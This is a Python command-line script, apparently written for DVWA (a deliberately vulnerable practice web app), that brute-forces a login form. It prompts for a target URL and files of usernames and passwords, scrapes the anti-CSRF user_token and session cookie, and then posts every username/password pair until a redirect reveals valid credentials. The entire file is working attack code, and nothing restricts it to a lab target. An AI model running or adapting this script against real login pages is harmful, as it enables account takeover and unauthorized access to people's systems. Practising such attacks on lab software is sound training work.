#!/usr/bin/env python3
#-*-coding: utf-8-*-

import re
import requests
from os import system
from urllib import request
from bs4 import BeautifulSoup as BS

# COLOR'S
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BANNER= """
       ______ _   _  _    _  ___              
       |  _  \ | | || |  | |/ _ \             
       | | | | | | || |  | / /_\ \            
       | | | | | | || |/\| |  _  |            
       | |/ /\ \_/ /\  /\  / | | |            
       |___/  \___/  \/  \/\_| |_/            
                                              
                                              
 _____ ______  ___  _____  _   __ ___________ 
/  __ \| ___ \/ _ \/  __ \| | / /|  ___| ___ |
| /  \/| |_/ / /_\ \ /  \/| |/ / | |__ | |_/ /
| |    |    /|  _  | |    |    \ |  __||    / 
| \__/\| |\ \| | | | \__/\| |\  \| |___| |\ \ 
 \____/\_| \_\_| |_/\____/\_| \_/\____/\_| \_|
                                              
                                              
"""

try:
    system('clear')

    print(bcolors.BOLD+bcolors.OKBLUE+BANNER+bcolors.ENDC)

    target = input(bcolors.BOLD+bcolors.OKBLUE+'[?]TARGET: '+bcolors.ENDC)
    usr_file = input(bcolors.BOLD+bcolors.OKBLUE+'[?]USER_FILE: '+bcolors.ENDC)
    passwd_file = input(bcolors.BOLD+bcolors.OKBLUE+'[?]PASSWD_FILE: '+bcolors.ENDC)

    system('clear')
except:
    exit(bcolors.BOLD+bcolors.WARNING+'\n[!]END'+bcolors.ENDC)

# GET TOKEN AND COOKIE'S
def token(url):
    get = requests.get(url)
    cookies = get.cookies.get_dict()
    cookies['security'] = 'low'

    soup = BS(get.text,features="lxml")
    elem = soup.findAll('input',attrs={'name':'user_token'})
    for tok in elem:
        token = tok['value']
    
    return cookies,token

# BRUTE-FORCE
def brute_force(info,usr_file,passwd_file):

    cookies = info[0]
    token = info[1]

    print(bcolors.OKBLUE+bcolors.BOLD+('[+]COOKIES: PHPSESSID: %s, SECURITY: %s' % (cookies['PHPSESSID'],cookies['security']))+bcolors.ENDC)
    print(bcolors.OKBLUE+bcolors.BOLD+('[+]TOKEN: %s\n' %token)+bcolors.ENDC)

    user = open(usr_file,'r')
    password = open(passwd_file,'r')

    users = list(user)
    passwords = list(password)

    for usr in users:
        for passwd in passwords:

            usr = usr.replace('\n','')
            passwd = passwd.replace('\n','')

            data = {
            'username':'%s'%usr,
            'password':'%s'%passwd,
            'Login':'Login',
            'user_token':token
            }
            
            post = requests.post(target,data=data,cookies=cookies,allow_redirects=False)

            cred = ''

            if post.headers['Location'] != 'index.php':
                print(bcolors.BOLD+bcolors.FAIL+('[!]BAD LOGIN OR PASSWORD\nLOGIN: %s PASSWORD: %s' % (usr,passwd))+bcolors.ENDC)
                cred = False
                system('clear')

            else:
                exit(bcolors.BOLD+bcolors.OKGREEN+('[+]OK\nLOGIN: %s PASSWORD: %s' % (usr,passwd))+bcolors.ENDC)
                cred = True

    if cred == False:
        print(bcolors.BOLD+bcolors.FAIL+'[!]NO CREDENTIALS'+bcolors.ENDC)

    user.close()
    password.close()

try:
    brute_force(token(target),usr_file,passwd_file)
except Exception as error:
    exit(bcolors.BOLD+bcolors.WARNING+('[!]END %s' % error)+bcolors.ENDC)
